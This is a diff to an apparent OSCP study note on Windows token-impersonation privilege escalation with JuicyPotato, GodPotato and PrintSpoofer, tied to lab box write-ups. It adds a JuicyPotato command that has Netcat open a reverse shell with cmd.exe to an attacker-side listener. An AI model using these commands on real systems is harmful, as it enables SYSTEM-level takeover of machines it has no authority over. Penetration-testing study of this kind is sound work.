@@ -14,7 +14,7 @@ GodPotato.exe -cmd "whoami"
 
 ## Example output
 
- > *Example shape only: these exact tool invocations are not yet verified against a real box.*
+ > *Example shape only: the exact binary, architecture, and CLSID must be verified against the current Windows build.*
 ```
 [+] Attempting token impersonation
 C:\> whoami
@@ -28,7 +28,7 @@ nt authority\system
 
 ## Notes
 
-These exact tool invocations are not directly demonstrated in the MarkUp write-up or the Forest and Sauna write-ups.
+PrintSpoofer, GodPotato, and JuicyPotato are alternatives, not interchangeable guarantees. Match the tool to the Windows build, token privilege, target architecture, and the available COM class.
 
 ## JuicyPotato with a tested CLSID
 
@@ -41,13 +41,23 @@ $PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID
 
 Here `-l` is JuicyPotato's local COM listener, `-t *` tries the available process-creation methods, `-p` selects the program to start, and `-c` selects the tested COM class. The reverse-shell listener remains a separate Kali-side port.
 
+## JuicyPotato callback with a separate Netcat listener
+
+When the target shell can run cmd.exe and a reviewed Netcat binary is present, pass the complete callback command through -a. Keep the COM listener and callback ports separate.
+
+~~~cmd
+$PotatoPath -l $PotatoPort -p $CmdPath -a "/c $NcPath $LocalIP $Port2 -e cmd.exe" -t * -c $CLSID
+~~~
+
 ## Gotcha
 
 > [!warning] 💡
-> The command and binary choice are not yet verified against the current vault box transcripts. Confirm before relying on this page.
+> The local `-l` COM listener is separate from a callback listener. Test the CLSID with `-z` first and use a harmless `whoami` proof before attempting a reverse shell.
 ## Seen in
 - [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- x86 JuicyPotato CLSID test and SYSTEM callback
+- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- x64 Windows build, verified CLSID test, and SYSTEM proof through an ASP shell
+- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- CLSID fallback and separate COM/callback ports from a Drupal command shell
 
 ## Related stages
 
